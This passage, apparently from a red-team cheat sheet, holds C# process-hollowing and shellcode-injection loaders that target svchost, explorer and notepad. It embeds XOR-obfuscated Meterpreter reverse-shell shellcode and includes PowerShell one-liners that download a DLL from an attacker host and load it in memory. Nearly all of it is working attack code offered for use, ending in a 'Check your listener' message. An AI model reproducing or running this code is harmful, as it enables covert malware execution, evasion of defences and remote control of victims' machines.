        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        if (!pwCreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
        {
            return;
        }

        IntPtr victimProcess = pi.hProcess;
        IntPtr shellAddress = pwVirtualAllocEx(victimProcess, IntPtr.Zero, (uint)payload.Length, 0x00001000 | 0x00002000, 0x40);
        IntPtr bytesWritten;

        pwProcmem(victimProcess, shellAddress, payload, (uint)payload.Length, out bytesWritten);

        IntPtr threadId;
        CreateRemoteThread(victimProcess, IntPtr.Zero, 0, shellAddress, IntPtr.Zero, 0, out threadId);
    }
}

```

### **DLL**

### **Shellcode Hollower**

**Load `shellcodeHollower` remotely**

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://[ATTACKER_IP]/run.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ProcessHollowingDLL.ProcessHollowing")  # Adjust the type name accordingly
$method = $class.GetMethod("PerformProcessHollowing")  # Ensure method name matches
$method.Invoke($null, $null)

```

**Code**

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowingDLL
{
    public class ProcessHollowing
    {
        // Define necessary structures
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        // Constants
        const uint CREATE_SUSPENDED = 0x00000004;
        const int ProcessBasicInformation = 0;

        // Function declarations
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            uint processInformationLength,
            ref uint returnLength
        );

        [DllImport("ntdll.dll")]
        static extern int NtReadVirtualMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int NumberOfBytesToRead,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int NumberOfBytesToWrite,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtResumeThread(IntPtr hThread, out uint lpPreviousSuspendCount);

        // Entry point function for DLL to be called externally
        public static void PerformProcessHollowing()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

            // Create process in suspended state (svchost.exe in this case)
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            if (!res)
            {
                int errorCode = Marshal.GetLastWin32Error();
                Console.WriteLine($"CreateProcess failed with error code: {errorCode}");
                return;
            }

            if (pi.hProcess == IntPtr.Zero || pi.hThread == IntPtr.Zero)
            {
                Console.WriteLine("Invalid process or thread handle.");
                return;
            }

            // Retrieve process information to locate the entry point
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            int status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            if (status != 0)
            {
                Console.WriteLine("Failed to query process information.");
                return;
            }

            IntPtr ptrImageBaseAddress = (IntPtr)((long)bi.PebAddress + 0x10);
            byte[] baseAddressBytes = new byte[IntPtr.Size];
            IntPtr nRead;

            // Read image base address
            NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

            byte[] data = new byte[0x200];
            NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entrypointRvaOffset = e_lfanew + 0x28;
            uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);

            IntPtr entrypointAddress = (IntPtr)((ulong)imageBaseAddress + entrypointRva);

            // msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=ens33 LPORT=443 -f csharp EXITFUNC=thread
            // XOR'd with key: 0xfa
            byte[] amit = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xAC, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB7, 0xCB, 0x33, 0xB2, 0x71, 0x88, 0xAA, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xBB, 0xAB, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xB2, 0xFB, 0x2A, 0x9C, 0x7B, 0x82, 0xE2, 0xF1, 0xF8, 0xF5, 0x7F, 0x88, 0xFA, 0xFA, 0xFA, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xAA, 0xBE, 0x71, 0xBA, 0xDA, 0x71, 0xB2, 0xE2, 0xB3, 0xFB, 0x2A, 0x19, 0xAC, 0xB7, 0xCB, 0x33, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB2, 0xCB, 0x3A, 0xBB, 0x3B, 0x33, 0xF7, 0x56, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xBB, 0xA2, 0xBB, 0xA2, 0xB2, 0xFB, 0x2A, 0xA4, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xB1, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0xF0, 0x9E, 0x9C, 0xE4, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0xBB, 0xA4, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0xB3, 0x05, 0x34, 0x8F, 0x1F, 0x12, 0x69, 0xFA, 0xFA, 0xFA, 0xB2, 0x79, 0x16, 0xEA, 0xB2, 0x73, 0x18, 0xB7, 0xCB, 0x33, 0x90, 0xFE, 0xBB, 0xA2, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xAF, 0xB2, 0x79, 0x3E, 0xDA, 0xA4, 0x73, 0x0C, 0x90, 0xBA, 0xBB, 0xA3, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xBB, 0xA2, 0xB2, 0x73, 0x08, 0xB2, 0xCB, 0x33, 0xBB, 0x40, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0xB2, 0x73, 0x39, 0xB3, 0x73, 0x3D, 0xB7, 0xCB, 0x33, 0xB3, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            for (int i = 0; i < amit.Length; i++)
            {
                amit[i] = (byte)((uint)amit[i] ^ 0xfa);
            }

            // Write the NOP shellcode to the process memory
            WriteProcessMemory(hProcess, entrypointAddress, amit, amit.Length, out nRead);

            // Resume the thread to execute the shellcode
            uint previousSuspendCount;
            int resumeStatus = NtResumeThread(pi.hThread, out previousSuspendCount);

            if (resumeStatus == 0)
            {
                Console.WriteLine("Boom! Check your listener.");
            }
            else
            {
                Console.WriteLine("Failed to resume the thread.");
            }
        }
    }
}

```

### **Shellcode Inject**

**Load `shellcodeInject` remotely**

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://[ATTACKER_IP]/run.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Inject.Injector")
$method = $class.GetMethod("InjectShellcode")
$method.Invoke($null, $null)

```

**Code**

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Inject
{
    public class Injector
    {
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);

        [DllImport("ntdll.dll")]
        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        // Expose the method for external use
        public static void InjectShellcode()
        {

            // ProcessStartInfo startInfo = new ProcessStartInfo("notepad.exe");
            // Process notepadProcess = Process.Start(startInfo);
            // Thread.Sleep(3000);
            Process[] targetProcess = Process.GetProcessesByName("explorer");
            IntPtr htargetProcess = targetProcess[0].Handle;

            IntPtr hProcess = IntPtr.Zero;
            CLIENT_ID clientid = new CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(targetProcess[0].Id);
            clientid.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();

            uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref ObjectAttributes, ref clientid);

            // The shellcode XOR'd with key: 0xfa
            byte[] buf = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB7, 0xCB, 0x33, 0xB2, 0x71, 0x88, 0xAA, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xBB, 0xAB, 0xB2, 0xFB, 0x2A, 0x9C, 0x7B, 0x82, 0xE2, 0xF1, 0xF8, 0xF5, 0x7F, 0x88, 0xFA, 0xFA, 0xFA, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xAA, 0xBE, 0x71, 0xBA, 0xDA, 0xB3, 0xFB, 0x2A, 0x71, 0xB2, 0xE2, 0x19, 0xAC, 0xB7, 0xCB, 0x33, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB2, 0xCB, 0x3A, 0xBB, 0x3B, 0x33, 0xF7, 0x56, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xB2, 0xFB, 0x2A, 0xBB, 0xA2, 0xBB, 0xA2, 0xA4, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xB1, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0x3A, 0x52, 0xC8, 0x6B, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0xBB, 0xA4, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0xB3, 0x05, 0x34, 0x8F, 0x1F, 0x12, 0x69, 0xFA, 0xFA, 0xFA, 0xB2, 0x79, 0x16, 0xEA, 0xB2, 0x73, 0x18, 0xB7, 0xCB, 0x33, 0x90, 0xFE, 0xBB, 0xA2, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xAF, 0xB2, 0x79, 0x3E, 0xDA, 0xA4, 0x73, 0x0C, 0x90, 0xBA, 0xBB, 0xA3, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xBB, 0xA2, 0xB2, 0x73, 0x08, 0xB2, 0xCB, 0x33, 0xBB, 0x40, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0xB2, 0x73, 0x39, 0xB3, 0x73, 0x3D, 0xB7, 0xCB, 0x33, 0xB3, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)buf.Length;

            IntPtr NtAllocResult = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Decode the payload
            for (int j = 0; j < buf.Length; j++)
            {
                buf[j] = (byte)((uint)buf[j] ^ 0xfa);
            }

            int NtWriteProcess = NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint wr);

            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess, (IntPtr)baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }
    }
}
```
